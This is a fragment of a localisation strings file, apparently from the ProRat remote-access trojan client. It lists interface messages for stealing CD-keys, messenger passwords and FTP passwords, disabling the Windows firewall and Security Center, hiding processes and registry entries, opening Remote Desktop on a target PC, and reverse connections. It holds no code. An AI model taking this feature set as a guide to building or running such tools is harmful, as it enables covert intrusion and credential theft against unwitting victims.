String813=Are you sure to use this IP address for ProConnective notifications?|Because this is a Local Area Network IP address,|if the server and client is not on the this network, |you won't be able to receive any information from the server.
String814=The ProConnective notification Test Message can't be delivered!
String815=ProConnective
String816=Admin-FTP
String817=Connect From Remote Desktop
String818=You have not installed Remote Desktop.|You can download and install it from www.microsoft.com
String819=You have not installed CuteFTP.|You can download and install it from www.globalscape.com
String820=You have not installed flashfxp.|You can download and install it from www.flashfxp.com
String821=Connect with CuteFtp
String822=Shortcut added.|Restart your browser.
String823=Shortcut removed.|Restart your browser.
String824=If you want to download a directory use FTP or|First archive it with winrar then download it by using file manager.
String825=Can't write to ProChecksum.
String826=Create Ultra Mini Downloader Server (%d Bytes)
String827=FlashFXP Ftp Passwords
String829=Plugin to grab CD-Keys is not loaded on the target machine. |Do you want to upload the plugin?
String830=Receiving Cd-Keys...
String831=Cd-Keys Received.
String832=You can only make process with the ProRat client by using the ProRat Server Port.|if you can't make any process please check your server port and try again.
String833=The Windows XP Firewall is running on your system.|The firewall will block the incoming information from servers.|Do you want to disable it?||IMPORTANT NOTE : before closing the windows XP firewall be sure that you have installed all the critical updates from http://windowsupdate.microsoft.com. if the critical updates are not installed in you system and if you close your Windows XP internal firewall various kinds of virus will infect your system.
String834=ProConnective will not work properly.|Do you want to continue?
String835=Windows XP Firewall is closed.
String836=Run ProConnective when Windows starts
String837=Are you sure to use this IP address for ProConnective notifications?|Because this is Local Area Network IP address,|if the server and client is not on the this network, |you won't be able to receive information from the server.
String838=You can not use this Ip address (127.0.0.1) for ProConnective notifications!
String839=Add a ProRat Shortcut to the Internet Explorer Toolbar.
String840=Remove ProRat Shortcut from the Internet Explorer Toolbar.
String841=Open RemoteDesktop
String842=RemoteDesktop Server is opened in the target pc.
String843=Target pc doesn't support RemoteDesktop.
String844=Opening RemoteDesktop server on target PC ...
String845=Don't send LAN notifications from ( 192.168.*.*) or (10.*.*.*)
String846=Hide Processes from All Task Managers  (9x/2k/XP)
String847=Hide Values From All kind of Registry Editors (9x/2k/XP)
String848=Hide Names From Msconfig  (9x/2k/XP)
String849=Plugin to grab Messengers passwords is not loaded on the target machine. |Do you want to upload the plugin?
String850=UnTerminate Process (2k/XP)
String851=Supports Reverse Connection
String852=Doesn't support Reverse Connection
String853=Get WAN IP Automaticly
String854=Start to list the ProConnective connections
String855=Renaming file...
String856=File Renamed.
String857=Can't rename file
String858=Rename
String859=Grab CD-KEYS
String860=Disable Windows XP SP2 Security Center